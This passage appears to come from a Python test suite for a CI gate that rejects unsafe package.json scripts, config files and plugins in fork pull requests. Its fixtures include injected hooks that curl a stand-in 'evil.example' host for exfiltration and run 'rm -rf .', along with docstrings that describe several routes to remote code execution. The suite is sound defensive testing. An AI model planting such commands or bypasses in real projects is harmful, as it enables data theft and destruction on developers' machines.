        run X`` / ``bun run X`` / bare ``yarn X`` / ``pnpm X`` /
        ``bun X`` all dispatch to a DIFFERENT named script in
        package.json. A fork PR can add ``"prettier": "sh -c '<evil>'"``
        and an accepted ``"format:check": "yarn run prettier --check ."``
        becomes RCE. Reject every dispatch prefix outright; only
        ``npx --no-install`` remains acceptable as a prefix.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npm run prettier --check .",
            "yarn run prettier --check .",
            "pnpm run prettier --check .",
            "bun run prettier --check .",
            "yarn prettier --check .",
            "pnpm prettier --check .",
            "bun prettier --check .",
            "npm run tsc --noEmit",
            "yarn run tsc --noEmit",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"nested package-manager dispatch must be rejected: {payload!r}"
            )
        # The safe forms still pass: direct tool invocation and the
        # validated npx --no-install prefix.
        assert _script_is_acceptable("prettier --check .") is True
        assert _script_is_acceptable("npx --no-install prettier --check .") is True

    def test_script_accepts_install_substring_in_path(self) -> None:
        """Iter-31 Finding 3: ``install`` / ``publish`` / ``deploy`` /
        ``start`` / ``build`` are dangerous as STANDALONE COMMAND
        TOKENS but completely fine as substrings inside legitimate
        filenames (e.g. ``src/install.ts``, ``startup.ts``). Use
        word-bounded matching so legitimate scripts are NOT
        false-rejected.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "prettier --check src/install.ts",
            "prettier --check src/startup.ts",
            "prettier --check src/deployment-helpers.ts",
            "prettier --check src/publishers.ts",
            "prettier --check src/builders.ts",
            "tsc --noEmit src/install.ts",
        ):
            assert _script_is_acceptable(payload) is True, (
                f"legitimate path-with-substring must pass: {payload!r}"
            )
        # Confirm the genuine danger is still rejected when the word
        # is a standalone token.
        for payload in (
            "prettier --check . && npm install",
            "prettier --check . start",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"standalone forbidden token must be rejected: {payload!r}"
            )

    def test_python_gates_skipped_when_pr_modifies_pyproject(
        self, tmp_path: Path
    ) -> None:
        """Iter-32 Findings 2 + 3: ruff/black/mypy all read PR-trusted
        configs from ``pyproject.toml``. A fork PR can poison
        ``[tool.black] force-exclude = '.*'`` (black silently passes)
        or ``[tool.ruff] exclude = ['a.py']`` (ruff silently passes).
        Skip ALL three when the PR touched any of the config
        surfaces those tools load.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        for changed in (
            ("pyproject.toml", "a.py"),
            ("setup.cfg", "a.py"),
            (".ruff.toml", "a.py"),
            ("ruff.toml", "a.py"),
            ("tox.ini", "a.py"),
            ("mypy.ini", "a.py"),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            names = {g.name for g in gates}
            for tool in ("ruff", "black", "mypy"):
                assert tool not in names, f"{tool} must skip when PR touched {changed}"

    def test_mypy_gate_skipped_when_local_plugin_declared(self, tmp_path: Path) -> None:
        """Iter-32 Finding 1: even when the PR does NOT modify
        pyproject.toml, mypy will import and execute any
        worktree-local plugin path the config already references.
        A stable ``[tool.mypy] plugins = ['./local_mypy_plugin.py']``
        plus a PR-modified plugin file is RCE. Skip the mypy gate
        whenever any declared plugin entry looks like a local path
        (relative, absolute, or ends in ``.py``).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        for plugins_value in (
            '["./local_mypy_plugin.py"]',
            '["plugins/evil.py"]',
            '["/abs/path/plugin.py"]',
            '"./inline_plugin.py"',
            '["mypy_django_plugin.main", "./local.py"]',
        ):
            (tmp_path / "pyproject.toml").write_text(
                f"[tool.mypy]\nplugins = {plugins_value}\n",
                encoding="utf-8",
            )
            gates = discover_gates(tmp_path, changed_files=("a.py",))
            names = {g.name for g in gates}
            assert "mypy" not in names, (
                f"mypy must skip when local plugin declared: {plugins_value}"
            )

    def test_mypy_gate_still_fires_for_pure_package_plugins(
        self, tmp_path: Path
    ) -> None:
        """Inverse of Finding 1: pure-package plugins (e.g.
        ``"mypy_django_plugin.main"``) live in installed site-packages,
        not in the worktree. A PR cannot modify them without
        touching the dependency manifest (which the
        pyproject-touched skip catches) or vendoring under
        node_modules / site-packages. Pure-package plugins are
        therefore safe and the mypy gate STILL fires for them when
        mypy is on PATH.
        """
        import shutil as _shutil
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["mypy_django_plugin.main", '
            '"some_other_package.helper"]\n',
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        # Test only meaningful when mypy is on PATH in the sandbox.
        if _shutil.which("mypy"):
            assert "mypy" in {g.name for g in gates}

    def test_mypy_gate_skipped_when_pr_modifies_config(self, tmp_path: Path) -> None:
        """Iter-31 Finding 2: mypy supports ``plugins = ["evil.py"]``
        under ``[tool.mypy]`` and imports/executes the plugin during
        type-checking. A fork PR that ships both a plugin file and
        a config update would RCE through the mypy gate. Skip mypy
        whenever its config surface (`pyproject.toml`, `mypy.ini`,
        `.mypy.ini`, `setup.cfg`) is in the PR diff. ruff/black
        have no equivalent Python-plugin escape hatch so they still
        fire.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        for changed in (
            ("pyproject.toml", "a.py"),
            ("mypy.ini", "a.py"),
            (".mypy.ini", "a.py"),
            ("setup.cfg", "a.py"),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            names = {g.name for g in gates}
            assert "mypy" not in names, f"mypy must skip when PR touched {changed}"
            # ruff/black still fire (they don't have plugin RCE).
            # Skipped if those tools aren't on PATH in the sandbox.

    def test_npm_script_gates_skipped_when_pr_touches_node_modules(
        self, tmp_path: Path
    ) -> None:
        """Iter-30 Finding 1: ANY npm-script gate invokes a binary
        from ``node_modules`` (directly or via npm's PATH-injection
        of ``node_modules/.bin``). A fork PR can add or modify any
        path under ``node_modules/`` to land a poisoned shim — the
        iter-29 narrow guard only covered the direct tsc gate and
        the prettier/eslint paths slipped through.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "format:check": "prettier --check .",
                    "lint:check": "eslint --no-fix .",
                    "typecheck": "tsc --noEmit",
                }
            ),
            encoding="utf-8",
        )
        # Each target hits a different attack surface but all live
        # under node_modules/, so all gates must skip.
        for changed in (
            ("node_modules/.bin/prettier",),
            ("node_modules/prettier/index.js",),
            ("node_modules/.bin/eslint",),
            ("node_modules/typescript/lib/typescript.js",),
            ("node_modules/some-tsc-plugin/index.js",),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            names = {g.name for g in gates}
            assert "npm:format:check" not in names, (
                f"format:check must skip on {changed}"
            )
            assert "npm:lint:check" not in names, f"lint:check must skip on {changed}"
            assert "npm:typecheck" not in names, f"typecheck must skip on {changed}"

    def test_tsconfig_chain_signals_emit_on_package_extends(
        self, tmp_path: Path
    ) -> None:
        """Iter-30 Finding 2: package-name extends (e.g.
        ``"@demo/tsconfig"``) resolve through ``node_modules`` to a
        config we can't statically read without parsing
        ``node_modules`` — and a fork PR can install/modify that
        package. The conservative answer is to assume the chain
        signals emit and skip the script gate.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        # Package-name extends — the gate must skip because we
        # cannot read what the resolved config says.
        (tmp_path / "tsconfig.json").write_text(
            '{"extends": "@demo/tsconfig"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_npm_tsc_script_gate_skipped_when_extends_chain_signals_incremental(
        self, tmp_path: Path
    ) -> None:
        """Iter-29 Finding 1: a top-level ``tsconfig.json`` with no
        ``incremental``/``composite`` field but ``extends:
        ./tsconfig.base.json`` where the base sets
        ``incremental: true`` still emits ``tsconfig.tsbuildinfo``
        when ``npm run typecheck`` runs. The script gate must walk
        the extends chain to detect that.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.base.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"extends": "./tsconfig.base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_tsc_gate_skipped_when_pr_touches_local_tsc_binary(
        self, tmp_path: Path
    ) -> None:
        """Iter-29 Finding 3: the direct tsc-noemit gate trusts
        ``node_modules/typescript/bin/tsc`` to be operator-supplied,
        but a fork PR can ADD or MODIFY that path (the file is
        nominally part of installed dependencies, but the PR file
        list is the source of truth). Skip when the PR diff
        contains anything under ``node_modules/typescript/`` or
        ``node_modules/.bin/tsc``.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        for changed in (
            ("node_modules/typescript/bin/tsc",),
            ("node_modules/typescript/package.json",),
            ("node_modules/.bin/tsc",),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            assert "tsc-noemit" not in {g.name for g in gates}, (
                f"direct tsc gate must skip when PR touches: {changed}"
            )

    def test_npm_tsc_script_gate_skipped_when_tsconfig_signals_incremental_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 1: a script-based tsc gate (e.g.
        ``"typecheck": "tsc --noEmit"``) runs the operator's
        unmodified argv. When tsconfig has ``incremental: true`` even
        the noEmit form writes ``tsconfig.tsbuildinfo`` into the
        worktree. The script gate cannot inject ``--incremental
        false`` like the direct gate can, so we MUST skip discovery
        on those repos."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_npm_tsc_script_gate_skipped_when_tsconfig_signals_composite(
        self, tmp_path: Path
    ) -> None:
        """Same as above for ``composite: true`` (which conflicts
        with --noEmit AND writes buildinfo)."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_tsc_direct_gate_passes_composite_false(self, tmp_path: Path) -> None:
        """Iter-28 Finding 2: ``composite: true`` set via the
        tsconfig extends chain only surfaces at compile time. The
        argv MUST pass ``--composite false`` to override regardless
        of what the resolved tsconfig says, so the gate doesn't
        produce a false TS6379 blocker on project-reference repos."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        # tsconfig itself does NOT enable composite — the extends
        # chain is what would trip TS6379. The argv defense fires
        # regardless of the top-level value.
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        assert "--composite" in cmd, cmd
        idx = cmd.index("--composite")
        assert cmd[idx + 1] == "false", cmd

    def test_prettier_script_gate_skipped_when_pr_changes_plugin_module(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 3: an unchanged ``prettier.config.cjs``
        can ``require('./local-plugin.cjs')`` — a PR that only
        modifies the plugin module still achieves RCE through the
        prettier gate. The iter-27 config-filename skip misses it.
        Widen the skip to ANY PR-modified ``.cjs``/``.mjs`` file
        plus any ``.js`` at the repo root (the common locations
        for tooling/plugin code).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR ONLY touched a plugin module loaded transitively.
        gates = discover_gates(tmp_path, changed_files=("local-plugin.cjs",))
        names = [g.name for g in gates]
        assert "npm:format:check" not in names
        # ``.mjs`` plugin module same.
        gates = discover_gates(tmp_path, changed_files=("plugins/foo.mjs",))
        assert "npm:format:check" not in [g.name for g in gates]
        # ``.js`` at the repo root (common for ``prettier.config.js``
        # plugin imports) same.
        gates = discover_gates(tmp_path, changed_files=("plugin.js",))
        assert "npm:format:check" not in [g.name for g in gates]

    def test_prettier_script_gate_skipped_on_any_js_change(
        self, tmp_path: Path
    ) -> None:
        """Iter-29 Finding 2 (revises iter-28 behaviour). Prettier
        configs ``require()`` arbitrary local JavaScript — including
        files in subdirectories like ``./src/plugin.js``. The
        iter-28 ``allow subdir .js`` heuristic was too lax: a
        stable ``prettier.config.cjs`` pulling in PR-modified
        ``./src/plugin.js`` still RCEs. The safer contract is to
        skip the prettier/eslint script gate whenever ANY ``.js`` /
        ``.cjs`` / ``.mjs`` file changed in the PR — we cannot
        statically follow the require chain.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # Subdirectory .js — iter-28 let this through; iter-29
        # skips it.
        for changed in (
            ("src/app.js",),
            ("src/components/foo.js",),
            ("packages/x/src/y.js",),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            assert "npm:format:check" not in {g.name for g in gates}, (
                f"prettier script gate must skip on JS change: {changed}"
            )

    def test_prettier_script_gate_still_fires_on_non_js_pr(
        self, tmp_path: Path
    ) -> None:
        """Inverse of the above: a PR that touches only non-JS
        files (markdown, YAML, Python) still gets the gate."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path,
            changed_files=("README.md", "docs/guide.md", "pkg/foo.py"),
        )
        assert "npm:format:check" in {g.name for g in gates}

    def test_tsc_noemit_substring_bypass_rejected(self) -> None:
        """Iter-27 Finding 2: ``tsc --noEmitOnError`` is a DIFFERENT
        TypeScript flag that does NOT suppress emit; the prior
        substring match (``"--noemit" not in stripped``) would have
        accepted it. ``tsc --noEmit false`` likewise emits.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc --noEmitOnError",
            "tsc --noEmitOnError -p tsconfig.json",
            "tsc --noEmit false",
            "tsc --noEmit no",
            "tsc -p tsconfig.json --noEmitOnError",
            "tsc -p tsconfig.json --noEmit false",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"emitting payload must be rejected: {payload!r}"
            )
        # Sanity: the explicit ``--noEmit true`` and bare ``--noEmit``
        # are both accepted.
        assert _script_is_acceptable("tsc --noEmit") is True
        assert _script_is_acceptable("tsc --noEmit true") is True
        assert _script_is_acceptable("tsc --noEmit --incremental false") is True

    def test_tsc_direct_gate_passes_incremental_false_and_redirects_buildinfo(
        self, tmp_path: Path
    ) -> None:
        """Iter-27 Finding 1: even ``tsc --noEmit`` writes
        ``tsconfig.tsbuildinfo`` when ``incremental: true`` is set
        in tsconfig. The direct tsc-noemit gate MUST pass
        ``--incremental false`` and ``--tsBuildInfoFile /dev/null``
        so the gate cannot dirty the worktree.
        """
        import os
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        # The argv MUST contain both safeguards.
        assert "--incremental" in cmd and "false" in cmd, cmd
        assert "--tsBuildInfoFile" in cmd, cmd
        # ``--tsBuildInfoFile`` MUST point at devnull (or another
        # path that cannot be staged into the worktree).
        idx = cmd.index("--tsBuildInfoFile")
        assert cmd[idx + 1] == os.devnull, cmd

    def test_tsc_direct_gate_emits_with_composite_false_even_on_composite_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 2 replaces iter-27's top-level composite
        skip. The argv now passes ``--composite false`` to override
        whatever the tsconfig (or its extends chain) says, so the
        gate STILL emits — and the tsc invocation no longer hits
        TS6379. The top-level skip is removed because it only
        covered top-level composite, while extends-chain composite
        was still a false-blocker hazard."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        # The argv carries the composite override; top-level
        # composite must NOT cause discovery to skip.
        idx = cmd.index("--composite")
        assert cmd[idx + 1] == "false", cmd

    def test_npm_gate_skipped_when_pr_modified_prettier_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-27 Finding 3: prettier loads ``prettier.config.{js,cjs,mjs}``
        (and ``.prettierrc.{js,cjs,mjs,ts}``) and executes it as
        JavaScript. A fork PR that ships a poisoned config can
        achieve RCE through the gate. Skip the gate when the PR
        modified any prettier config file.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR-modified prettier config in the changed-file inventory.
        gates = discover_gates(tmp_path, changed_files=("prettier.config.cjs",))
        names = [g.name for g in gates]
        assert "npm:format:check" not in names
        # Sanity: when the PR did NOT touch the config the gate
        # still fires (this is the existing safe path).
        gates2 = discover_gates(tmp_path, changed_files=("src/a.ts",))
        assert "npm:format:check" in [g.name for g in gates2]

    def test_tsc_direct_gate_skipped_when_pr_modified_tsconfig(
        self, tmp_path: Path
    ) -> None:
        """Same as above but for the direct tsc-noemit path:
        ``tsconfig.json`` carries ``compilerOptions.paths`` /
        ``plugins`` / transformer references that tsc will load.
        Skip when the PR modified it."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("tsconfig.json",))
        assert "tsc-noemit" not in {g.name for g in gates}

    def test_script_rejects_tsc_p_without_noemit(self) -> None:
        """Iter-26 Finding 1: ``tsc -p <project>`` without ``--noEmit``
        writes .js / .d.ts / .tsbuildinfo files to the worktree. The
        head match alone is not enough — require ``--noEmit`` in the
        argv before accepting.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc -p tsconfig.json",
            "tsc -p .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"tsc -p without --noEmit must be rejected: {payload!r}"
            )
        # The safe forms still pass.
        assert _script_is_acceptable("tsc --noEmit") is True
        assert _script_is_acceptable("tsc --noEmit -p tsconfig.json") is True
        assert _script_is_acceptable("tsc -p tsconfig.json --noEmit") is True

    def test_script_rejects_eslint_without_no_fix(self) -> None:
        """Iter-26 Finding 2: bare ``eslint .`` is rejected — ESLint
        config files can enable fix mode silently via
        ``"fix": true``. Require explicit ``--no-fix`` opt-out.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "eslint .",
            "eslint src/",
            "eslint --max-warnings 0 .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"eslint without --no-fix must be rejected: {payload!r}"
            )
        assert _script_is_acceptable("eslint --no-fix .") is True

    def test_script_rejects_cache_flag(self) -> None:
        """Iter-26 Finding 2: ``--cache`` writes a worktree-resident
        cache file (``.eslintcache`` / ``.prettiercache``). Gates
        must be non-mutating, so any ``--cache`` flag is rejected.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "eslint --no-fix --cache .",
            "prettier --check --cache .",
            "npx --no-install eslint --no-fix --cache .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"--cache payload must be rejected: {payload!r}"
            )

    def test_script_rejects_bare_npx_prefix(self) -> None:
        """Iter-22 Finding 2: ``npm run <script>`` lets the script body
        execute. A script body of ``npx tsc --noEmit`` or
        ``npx prettier --check .`` would let `npx` reach the npm
        registry and install/exec the tool when it is not in local
        ``node_modules`` — the same network-install hole the
        tsconfig-discovery path closes with ``--no-install``.
        ``_script_is_acceptable`` MUST reject bare ``npx`` prefixes.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npx tsc --noEmit",
            "npx prettier --check .",
            "npx prettier --check src/**/*.ts",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"bare npx payload {payload!r} must be rejected"
            )

    def test_script_accepts_npx_with_no_install(self) -> None:
        """Iter-22 Finding 2 inverse: an explicit ``npx --no-install``
        invocation is the documented safe form (operators opt into
        the gate without the registry-install fallback)."""
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npx --no-install tsc --noEmit",
            "npx --no-install prettier --check .",
        ):
            assert _script_is_acceptable(payload) is True, (
                f"safe npx payload {payload!r} must be accepted"
            )

    def test_discover_skips_npm_script_with_bare_npx_prefix(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` that smuggles in
        bare ``npx tsc`` via a recognised script name must NOT emit a
        gate; the npm-run path would otherwise reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"typecheck": "npx tsc --noEmit"}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_script_accepts_legitimate_prettier_with_glob(self) -> None:
        """Positive sanity: a real prettier invocation with a glob and
        space-separated args must STILL be accepted — the metachar guard
        cannot be so wide it breaks normal scripts."""
        from pdd.checkup_gates import _script_is_acceptable

        assert _script_is_acceptable("prettier --check src/**/*.ts") is True
        assert _script_is_acceptable("prettier --check '.'") is True
        assert _script_is_acceptable("prettier --check src/foo.ts src/bar.ts") is True
        assert _script_is_acceptable("tsc --noEmit") is True

    def test_discover_skips_npm_script_with_shell_metachars(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` must NOT emit a gate."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {"format:check": "prettier --check && curl http://evil.example/"}
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_pre_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 2: a benign script must NOT be invoked when
        ``pre<name>``/``post<name>`` lifecycle hooks would also execute.
        npm/yarn/pnpm/bun fire those hooks around ``<runner> run <name>``,
        and discovery only validates the named script — so a malicious
        ``preformat:check`` would smuggle ``curl`` past the allowlist.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "format:check": "prettier --check .",
                    "preformat:check": "curl http://evil.example/exfil",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_post_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "typecheck": "tsc --noEmit",
                    "posttypecheck": "rm -rf .",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_git_diff_check_uses_pr_range_when_base_ref_resolvable(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 1: a committed whitespace failure on the PR
        branch must be caught even when the worktree is clean. The gate
        must run ``git diff --check <base>...HEAD``, not the plain
        ``git diff --check`` against unstaged worktree changes.
        """
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@x",
                "commit",
                "--allow-empty",
                "-m",
                "init",
                "-q",
            ],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(
            ["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True
        )
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@x",
                "commit",
                "--allow-empty",
                "-m",
                "feat",
                "-q",
            ],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref="main")
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert Path(diff_gate.cmd[0]).is_absolute()
        assert diff_gate.cmd[1:] == ["diff", "--check", "main...HEAD"]

    def test_git_diff_check_falls_back_when_base_ref_unresolvable(
        self, tmp_path: Path
    ) -> None:
        """When no base ref verifies AND no ``main``/``master`` exists
        in the worktree (synthetic test repo on a feature branch with
        no remote), we keep the existing plain ``git diff --check`` so
        single-commit smoke tests still see a gate."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(
            ["git", "init", "-q", "-b", "feature-only"], cwd=tmp_path, check=True
        )
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@x",
                "commit",
                "--allow-empty",
                "-m",
                "init",
                "-q",
            ],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(
            tmp_path,
            changed_files=(),
            base_ref="branch-that-does-not-exist",
        )
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert Path(diff_gate.cmd[0]).is_absolute()
        assert diff_gate.cmd[1:] == ["diff", "--check"]

    def test_git_diff_check_falls_back_to_main_master_when_no_base_ref(
        self, tmp_path: Path
    ) -> None:
        """When no ``base_ref`` is supplied but a local ``main``/``master``
        exists (the default for ``git init``), discovery still uses it
        so the PR-range guarantee holds even when the caller forgot to
        thread ``pr_metadata['base_ref']`` through. This preserves the
        product invariant from issue #1092: a committed whitespace
        failure must be caught."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # Either ``master...HEAD`` or ``main...HEAD`` depending on the
        # local ``init.defaultBranch`` — both satisfy the contract.
        assert Path(diff_gate.cmd[0]).is_absolute()
